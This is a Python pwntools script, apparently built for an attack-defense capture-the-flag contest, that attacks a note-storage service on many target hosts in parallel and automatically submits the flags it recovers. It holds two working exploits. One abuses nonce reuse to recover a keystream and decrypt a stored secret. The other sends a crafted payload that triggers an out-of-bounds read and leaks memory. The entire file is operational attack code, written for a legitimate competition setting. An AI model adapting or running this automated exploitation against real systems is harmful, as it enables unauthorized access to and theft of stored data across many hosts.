#!/usr/bin/env python3
"""
BabyEnc Fast Parallel Exploit v3
- Parallel attacks on all targets
- Multiple exploit methods with fallback
"""
import os
os.environ['PWNLIB_NOTERM'] = '1'

import sys
import argparse
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pwn import *
from awd_lib import chal, submit, get_targets, get_our_ip

# Rate limit submissions to avoid throttling
_submit_lock = threading.Lock()
_last_submit = 0
SUBMIT_DELAY = 0.5  # seconds between submissions


def rate_limited_submit(flag):
    """Submit with rate limiting to avoid throttling"""
    global _last_submit
    with _submit_lock:
        elapsed = time.time() - _last_submit
        if elapsed < SUBMIT_DELAY:
            time.sleep(SUBMIT_DELAY - elapsed)
        result = submit(flag)
        _last_submit = time.time()
        return result

context.log_level = 'error'
chal(creds_file="babyenc.xls")

PORT = 1000
TIMEOUT = 5
MAX_WORKERS = 8


def exploit_nonce_reuse(ip, port=PORT):
    """Fast nonce reuse exploit"""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Get flag cipher
        io.recvuntil(b'> ')
        io.sendline(b'3')
        io.recvuntil(b'index: ')
        io.sendline(b'0')
        resp = io.recvuntil(b'> ', timeout=TIMEOUT)
        
        if b'system note (enc): ' not in resp:
            io.close()
            return None
        
        start = resp.find(b'system note (enc): ') + len(b'system note (enc): ')
        end = resp.find(b'\n', start)
        flag_cipher = bytes.fromhex(resp[start:end].strip().decode())
        
        zeros_hex = b'00' * len(flag_cipher)
        
        # Create, encrypt, decrypt, delete, create, encrypt
        io.sendline(b'1'); io.recvuntil(b'index: '); io.sendline(b'2')
        io.recvuntil(b'length: '); io.sendline(str(len(flag_cipher)).encode())
        io.recvuntil(b'data hex: '); io.sendline(zeros_hex); io.recvuntil(b'> ')
        
        io.sendline(b'4'); io.recvuntil(b'index: '); io.sendline(b'2'); io.recvuntil(b'> ')
        io.sendline(b'5'); io.recvuntil(b'index: '); io.sendline(b'2'); io.recvuntil(b'> ')
        io.sendline(b'6'); io.recvuntil(b'index: '); io.sendline(b'2'); io.recvuntil(b'> ')
        
        io.sendline(b'1'); io.recvuntil(b'index: '); io.sendline(b'3')
        io.recvuntil(b'length: '); io.sendline(str(len(flag_cipher)).encode())
        io.recvuntil(b'data hex: '); io.sendline(zeros_hex); io.recvuntil(b'> ')
        
        io.sendline(b'4'); io.recvuntil(b'index: '); io.sendline(b'3')
        resp = io.recvuntil(b'> ', timeout=TIMEOUT)
        
        if b'note cipher(hex): ' in resp:
            start = resp.find(b'note cipher(hex): ') + len(b'note cipher(hex): ')
            end = resp.find(b'\n', start)
            keystream = bytes.fromhex(resp[start:end].strip().decode())
            flag = bytes(a ^ b for a, b in zip(flag_cipher, keystream))
            flag_str = flag.decode('utf-8', errors='replace')
            io.close()
            if flag_str.startswith('flag{') and '}' in flag_str:
                return flag_str[:flag_str.index('}')+1]
        io.close()
        return None
    except:
        return None


def exploit_audit_leak(ip, port=PORT):
    """Audit field OOB read - leaks flag plaintext directly!"""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        io.recvuntil(b'> ')
        
        # Create note with OOB payload: read 64 bytes from offset 0x20
        data = bytes([64, 0x20]) + b'\x00' * 62
        io.sendline(b'1'); io.recvuntil(b'index: '); io.sendline(b'1')
        io.recvuntil(b'length: '); io.sendline(b'64')
        io.recvuntil(b'data hex: '); io.sendline(data.hex().encode())
        io.recvuntil(b'> ')
        
        # Show note to trigger audit leak
        io.sendline(b'3'); io.recvuntil(b'index: '); io.sendline(b'1')
        resp = io.recvuntil(b'> ', timeout=TIMEOUT)
        
        io.close()
        
        if b'audit(hex):' in resp:
            start = resp.find(b'audit(hex): ') + len(b'audit(hex): ')
            end = resp.find(b'\n', start)
            leaked = bytes.fromhex(resp[start:end].strip().decode())
            if b'flag{' in leaked:
                flag_start = leaked.find(b'flag{')
                flag_end = leaked.find(b'}', flag_start) + 1
                return leaked[flag_start:flag_end].decode()
        return None
    except:
        return None


def attack_target(ip, port=PORT):
    """Attack single target with multiple methods"""
    # Try nonce reuse first (faster)
    flag = exploit_nonce_reuse(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        if result.get('success'):
            status = "NEW" if not result.get('duplicate') else "dup"
        else:
            status = f"reject:{result.get('message', 'unknown')}"
        return (ip, flag, status, "nonce")
    
    # Fallback to audit leak
    flag = exploit_audit_leak(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        if result.get('success'):
            status = "NEW" if not result.get('duplicate') else "dup"
        else:
            status = f"reject:{result.get('message', 'unknown')}"
        return (ip, flag, status, "audit")
    
    return (ip, None, "failed", None)


def main():
    parser = argparse.ArgumentParser(description='BabyEnc Fast Parallel Exploit v3')
    parser.add_argument('--target', '-t', help='Single target IP')
    parser.add_argument('--port', '-p', type=int, default=PORT)
    parser.add_argument('--loop', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', type=int, default=60, help='Loop delay')
    parser.add_argument('--workers', '-w', type=int, default=MAX_WORKERS)
    args = parser.parse_args()
    
    our_ip = get_our_ip()
    targets = [args.target] if args.target else get_targets()
    
    print(f"[*] Our IP: {our_ip}, Targets: {len(targets)}, Workers: {args.workers}")
    
    while True:
        success = failed = new_flags = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(attack_target, ip, args.port): ip for ip in targets}
            
            for future in as_completed(futures):
                ip, flag, status, method = future.result()
                if flag:
                    m = f"[{method}]" if method else ""
                    print(f"[+] {ip}: {flag} ({status}) {m}")
                    success += 1
                    if status == "NEW":
                        new_flags += 1
                else:
                    print(f"[-] {ip}: {status}")
                    failed += 1
        
        elapsed = time.time() - start_time
        print(f"[*] Round: {success} ok, {failed} fail, {new_flags} NEW ({elapsed:.1f}s)")
        
        if not args.loop:
            break
        time.sleep(args.delay)


if __name__ == '__main__':
    main()
